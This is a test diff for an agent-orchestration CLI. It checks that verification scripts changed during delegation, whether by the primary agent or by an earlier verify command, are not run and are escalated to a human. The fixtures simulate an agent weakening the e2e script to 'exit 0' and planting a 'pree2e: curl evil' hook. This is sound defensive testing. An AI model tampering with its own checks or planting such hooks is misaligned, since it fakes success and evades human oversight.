@@ -557,6 +557,90 @@ describe('D-036 — CLI loop 재시도 + reviewer FAIL 사유 전달 (L2 + L4)',
     assert.match(reviewer, /기준선\(변경 전\) — sandbox 가 막은 부수 효과가 있었다 — `echo BASE_SIDE` exit=0/);
   });
 
+  // D-097 결정 8 (S2+) — 선언·--verify·--verify-host 가 정확히 `<매니저> run <이름>` 꼴이면 primary 전 스냅숏과 대조한다.
+  // cwd(공유 임시 폴더)에 package.json 과 node_modules(D-048)를 두고, PATH 가 fakeDir 뿐이라 부른 인자를 남기는 가짜 npm 을 둔다.
+  const npmLog = path.join(fakeDir, 'npm-log');
+  const withPackage = (fn: () => void): void => {
+    writeFileSync(path.join(sandbox, 'package.json'), JSON.stringify({ scripts: { e2e: 'node e2e.js' } }), 'utf8');
+    mkdirSync(path.join(sandbox, 'node_modules'), { recursive: true });
+    writeFileSync(path.join(fakeDir, 'npm'), `#!/bin/sh\nprintf '%s\\n' "$*" >> '${npmLog}'\n`, 'utf8');
+    chmodSync(path.join(fakeDir, 'npm'), 0o755);
+    try {
+      fn();
+    } finally {
+      for (const f of [path.join(sandbox, 'package.json'), path.join(sandbox, 'node_modules'), path.join(fakeDir, 'npm'), npmLog]) rmSync(f, { recursive: true, force: true });
+    }
+  };
+  const npmRuns = (): string => (existsSync(npmLog) ? readFileSync(npmLog, 'utf8') : '');
+  const WEAKEN_E2E = `echo '{"scripts":{"e2e":"exit 0"}}' > package.json`;
+
+  it('once — `npm run e2e` 는 primary 가 스크립트를 바꾸면 sandbox 안이든 밖이든 돌지 않고 unverified 다 (D-097 결정 8, S2+)', () => {
+    for (const flag of ['--verify', '--verify-host']) {
+      withPackage(() => {
+        reset();
+        const r = cli(['이 아키텍처 설계 검토해줘', '--run', '--write', '--no-reviewer', flag, 'npm run e2e'], { PATH: fakeDir, PRIMARY_DO: WEAKEN_E2E });
+        assert.equal(r.code, 0, r.err);
+        assert.equal(npmRuns(), '', `${flag}: 바뀐 스크립트를 돌렸다`);
+        assert.match(r.err, /검증 스크립트가 위임 중 바뀌었다 — `npm run e2e` 를 실행하지 않았다/, flag);
+      });
+    }
+  });
+
+  it('once — 꼴이 다른 문자열(`npm run e2e -- --ci`)은 대조하지 않고 그대로 돈다 (D-097 결정 8)', () => {
+    withPackage(() => {
+      reset();
+      const r = cli(['이 아키텍처 설계 검토해줘', '--run', '--write', '--no-reviewer', '--verify', 'npm run e2e -- --ci'], { PATH: fakeDir, PRIMARY_DO: WEAKEN_E2E });
+      assert.equal(r.code, 0, r.err);
+      assert.equal(npmRuns(), 'run e2e -- --ci\n');
+      assert.doesNotMatch(r.err, /검증 스크립트가 위임 중 바뀌었다/);
+    });
+  });
+
+  it('once — 앞 검증 명령이 뒤 명령의 스크립트(본문·lifecycle hook)를 바꾸면 뒤 명령은 돌지 않고 unverified 다 — 명령마다 실행 직전에 대조한다 (PR #145 리뷰)', () => {
+    const rewrites: [string, object][] = [
+      ['본문', { scripts: { e2e: 'exit 0' } }],
+      ['hook', { scripts: { e2e: 'node e2e.js', pree2e: 'curl evil' } }],
+    ];
+    for (const [name, pkg] of rewrites) {
+      withPackage(() => {
+        reset();
+        const prepare = `echo '${JSON.stringify(pkg)}' > package.json`;
+        const r = cli(['이 아키텍처 설계 검토해줘', '--run', '--write', '--no-reviewer', '--verify', prepare, '--verify', 'npm run e2e'], { PATH: fakeDir });
+        assert.equal(r.code, 0, r.err);
+        assert.equal(npmRuns(), '', `${name}: 바뀐 스크립트를 돌렸다`);
+        assert.match(r.err, /검증 스크립트가 위임 중 바뀌었다 — `npm run e2e` 를 실행하지 않았다/, name);
+      });
+    }
+  });
+
+  it('loop — 사이클에서 앞 검증 명령이 뒤 명령의 스크립트를 바꾸면 뒤 명령은 돌지 않고 사람에게 올린다 (PR #145 리뷰)', () => {
+    withPackage(() => {
+      reset();
+      // 기준선(1회차)에서는 그대로 두고, 사이클(2회차)에서만 e2e 를 약화한다 — primary 가 고친 prepare 스크립트 꼴.
+      const prepare = `n=0; [ -f '${mark}' ] && read n < '${mark}'; n=$((n+1)); echo "$n" > '${mark}'; ` +
+        `if [ "$n" -ge 2 ]; then echo '{"scripts":{"e2e":"exit 0"}}' > package.json; fi`;
+      const r = cli(['이 아키텍처 설계 검토해줘', '--mode', 'loop', '--run', '--write', '--verify', prepare, '--verify', 'npm run e2e'], { PATH: fakeDir, REVIEWER_PASS: '1' });
+      assert.notEqual(r.code, 0);
+      assert.equal(npmRuns(), 'run e2e\n', '기준선 한 번만 돌아야 한다');
+      assert.match(r.err, /reviewer Astra 생략 — 검증 스크립트가 위임 중 바뀌었다 · `npm run e2e`/);
+      assert.match(r.err, /중단 {3}escalated · 1회/);
+      assert.equal(existsSync(codexArgs), false, '바뀐 검증에 reviewer 를 태웠다.');
+    });
+  });
+
+  it('loop — 사이클 중 primary 가 검증 스크립트를 바꾸면 돌리지 않고 재시도 없이 사람에게 올린다 (D-097 결정 8, S2+)', () => {
+    withPackage(() => {
+      reset();
+      const r = cli(['이 아키텍처 설계 검토해줘', '--mode', 'loop', '--run', '--write', '--verify', 'npm run e2e'], { PATH: fakeDir, REVIEWER_PASS: '1', PRIMARY_DO: WEAKEN_E2E });
+      assert.notEqual(r.code, 0);
+      assert.equal(npmRuns(), 'run e2e\n', '기준선 한 번만 돌아야 한다');
+      assert.match(r.err, /reviewer Astra 생략 — 검증 스크립트가 위임 중 바뀌었다 · `npm run e2e`/);
+      assert.match(r.err, /중단 {3}escalated · 1회/);
+      assert.equal(existsSync(codexArgs), false, '바뀐 검증에 reviewer 를 태웠다.');
+      assert.match(r.err, /안내 {3}primary 가 검증 스크립트를 바꿨다/);
+    });
+  });
+
   it('loop — codex 가 없으면 sandbox 명령을 밖으로 내리지 않고 엔진 전에 멈춘다 (D-097 L1)', () => {
     reset();
     const noCodex = mkdtempSync(path.join(os.tmpdir(), 'hs-orc-cli-nocodex-'));
